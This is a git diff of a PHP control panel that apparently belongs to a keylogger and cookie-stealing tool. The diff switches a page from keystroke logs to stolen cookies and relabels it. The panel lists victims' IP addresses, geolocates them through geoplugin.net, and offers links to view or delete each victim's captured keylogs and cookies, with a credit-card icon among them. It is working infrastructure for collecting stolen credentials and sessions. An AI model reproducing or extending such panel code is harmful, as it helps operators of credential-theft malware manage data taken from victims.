@@ -11,7 +11,7 @@ if (!isset($_SESSION['logged_in'])
 <head>
       <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Keyboard</title> 
+    <title> Web Panel</title> 
 
     <script src="css/bootstrap/js/jquery-3.4.1.min.js"></script>
     <script src="css/bootstrap/js/bootstrap.bundle.min.js"></script>
@@ -34,7 +34,7 @@ if (!isset($_SESSION['logged_in'])
 <?php
   // Get dirs
   function get_dirs($dir = '') {
-    return array_filter(glob('logs/' . $dir . '*'), 'is_dir');
+    return array_filter(glob('cookies/' . $dir . '*'), 'is_dir');
   }
   // Get log files in dir
   function get_files($dir = '') {
@@ -116,7 +116,8 @@ font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">L
                     <img src="assets/img/find_user.png" class="user-image img-responsive"/>
 					</li>
 				
-					    <li>
+					  
+                      <li>
                         <a class="active-menu"  href="index.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard</a>
                     </li>
                      <li>
@@ -125,9 +126,9 @@ font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">L
 
                     <li  >
                         <a  href="cookies.php"><i class="fa fa-table fa-3x"></i>Cookies</a>
-                    </li> 
+                    </li>
 
-                   
+                 
 
 
                 </ul>
@@ -141,8 +142,7 @@ font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">L
             <div id="page-inner">
                 <div class="row">
                     <div class="col-md-12">
-                     <h2>keyboard
-      
+                     <h2>Cookies
 
                      </h2>   
                       
@@ -153,13 +153,11 @@ font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">L
                     <!-- Advanced Tables -->
                     <div class="panel panel-default">
                         <div class="panel-heading">
-                             keyboard recorded with each user in a single html file:                        
+                             Cookies recorded with each user in a single html file:                         
                            </div>
                         <div class="panel-body">
                             <div class="table-responsive">
                                 <table class="table table-striped table-bordered table-hover" id="Keystrokes">  
-  
-<tbody>
 
     
  <!-- TABLE -->
@@ -187,14 +185,14 @@ font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">L
 
         $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));  
           
-        // display ip,countryName,dat
+        // display ip,countryName,date
         echo "
         <tr>
           <td>$ip</a></td>
           <td>$ipdat->geoplugin_countryName</td>
           <td>$remote_dat</td>
           <td>
-            <i title='Show information' class='sinfo material-icons' onclick=\"window.open('$log_file ','newwindow', 'width=700,height=700');return false;\">credit_card</i>
+            <i title='Show keylogs' class='skeylogs material-icons' onclick=\"window.open('$log_file ','newwindow', 'width=700,height=700');return false;\">keyboard</i>
             <i title='Remove log' class='rlogs material-icons' onclick=\"remove_log('$log_file', this);\">delete_forever</i>
           </td>
         </tr>";
@@ -208,10 +206,10 @@ font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">L
     </tbody>
   </table>
 
+
 </body>
 </html>
             
-                   
          <!-- /. PAGE WRAPPER  -->
      <!-- /. WRAPPER  -->
     <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
